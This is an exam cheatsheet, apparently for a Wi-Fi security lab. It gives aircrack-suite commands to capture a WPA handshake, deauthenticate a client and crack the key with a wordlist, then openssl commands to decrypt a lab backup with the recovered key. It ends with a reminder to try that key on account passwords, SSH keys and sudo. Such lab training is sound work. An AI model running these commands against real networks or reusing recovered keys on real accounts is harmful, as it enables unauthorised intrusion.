# Cheatsheet — exam quick reference

## Live capture cycle

```bash
sudo airmon-ng start wlan1
sudo airodump-ng -c 1 --bssid <AP> -w cap wlan1mon
sudo aireplay-ng -0 3 -a <AP> -c <CLIENT> wlan1mon
aircrack-ng -w /opt/wifi/wordlist.txt cap-01.cap
```

## openssl decrypt (this lab's format)

```bash
openssl enc -d -aes-256-cbc -pbkdf2 \
    -in /opt/wifi/backup.enc \
    -out /home/wifi/backup.txt \
    -k <recovered-psk>
cat /home/wifi/backup.txt        # must contain BACKUP-KEY
```

## openssl variants to try if -k fails

```bash
openssl enc -d -aes-256-cbc -in f.enc -out f.txt -k <key>
openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 ...
openssl enc -d -aes-128-cbc -pbkdf2 ...
# Bad decrypt / wrong tag = wrong key OR wrong options, not wrong password alone
```

## Reminder

PSK recovered → it may unlock MORE than wifi. Try: enc backups, account
passwords, ssh keys, sudo.
